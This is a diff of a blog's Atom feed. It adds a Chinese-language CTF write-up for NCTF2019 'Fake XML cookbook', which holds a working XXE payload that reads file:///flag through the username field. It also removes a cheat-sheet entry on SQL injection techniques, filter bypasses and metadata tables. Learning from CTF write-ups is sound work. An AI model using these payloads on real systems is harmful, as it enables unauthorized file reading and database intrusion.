@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-04-24T04:49:27.175Z</updated>
+  <updated>2022-04-27T07:54:32.495Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>&lt;NCTF2019&gt;Fake XML cookbook</title>
+    <link href="http://example.com/[NCTF2019]Fake%20XML%20cookbook/"/>
+    <id>http://example.com/[NCTF2019]Fake%20XML%20cookbook/</id>
+    <published>2022-04-26T16:00:00.000Z</published>
+    <updated>2022-04-27T07:54:32.495Z</updated>
+    
+    <content type="html"><![CDATA[<p>首先从题目名字已经很明显了，就是XXE，打开题目是登录界面，抓包，发现回显的数据是提交的用户名，对用户名进行外部实体声明，最终发现<code>flag</code>就在根目录下</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY b SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;首先从题目名字已经很明显了，就是XXE，打开题目是登录界面，抓包，发现回显的数据是提交的用户名，对用户名进行外部实体声明，最终发现&lt;code&gt;flag&lt;/code&gt;就在根目录下&lt;/p&gt;
+&lt;pre class=&quot;line-numbers language-xml&quot; data-</summary>
+      
+    
+    
+    
+    <category term="xxe" scheme="http://example.com/categories/xxe/"/>
+    
+    
+    <category term="wp" scheme="http://example.com/tags/wp/"/>
+    
+  </entry>
   
   <entry>
     <title>&lt;SUCTF 2019&gt;Pythonginx</title>
@@ -507,37 +532,6 @@
     
     
     <category term="code audit" scheme="http://example.com/categories/code-audit/"/>
-    
-    
-    <category term="basic" scheme="http://example.com/tags/basic/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sql injection</title>
-    <link href="http://example.com/sql%20injection/"/>
-    <id>http://example.com/sql%20injection/</id>
-    <published>1970-01-01T00:00:00.000Z</published>
-    <updated>2022-04-25T05:10:20.722Z</updated>
-    
-    <content type="html"><![CDATA[<ol><li>堆叠注入</li><li>union注入</li><li>报错注入 updatexml() , extractvalue()</li><li>布尔盲注 if(,,)  、^</li></ol><p><strong>截断字符串</strong></p><ul><li>substr()</li><li>mid()</li><li>substring()</li><li>left() </li><li>right()</li></ul><p><strong>常用函数</strong></p><ul><li>database()</li><li>version()</li><li>user()</li><li>concat()</li><li>group_concat()</li><li></li></ul><p><strong>绕过</strong></p><ul><li>（）和Tab 代替空格</li><li>双写</li><li>大小写</li><li>内联注释</li><li>handler &lt;table&gt; open &lt;name&gt;;handler &lt;name&gt; read first</li></ul><p><strong>可利用的表</strong></p><ul><li>information_schema.tables    <code>table_schema</code> <code>table_name</code></li><li>information_schema.columns <code>table_schema</code> <code>table_name</code> <code>column_name</code></li><li></li><li>mysql.innodb_table_stats    <code>table_name</code> <code>database_name</code></li><li>mysql.innodb_index_stats <code>table_name</code> <code>database_name</code></li><li></li><li>sys.schema_table_statistics <code>table_schema</code> <code>table_name</code> </li><li>sys.schema_table_statistics_with_buffer <code>table_schema</code> <code>table_name</code></li><li>sys.schema_auto_increment_columns <code>table_schema</code> <code>table_name</code> </li></ul><p><strong>额外</strong></p><ul><li>无列名注入</li><li></li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;ol&gt;
-&lt;li&gt;堆叠注入&lt;/li&gt;
-&lt;li&gt;union注入&lt;/li&gt;
-&lt;li&gt;报错注入 updatexml() , extractvalue()&lt;/li&gt;
-&lt;li&gt;布尔盲注 if(,,)  、^&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;strong&gt;截断字符串&lt;/strong&gt;&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="SQL injection" scheme="http://example.com/categories/SQL-injection/"/>
     
     
     <category term="basic" scheme="http://example.com/tags/basic/"/>
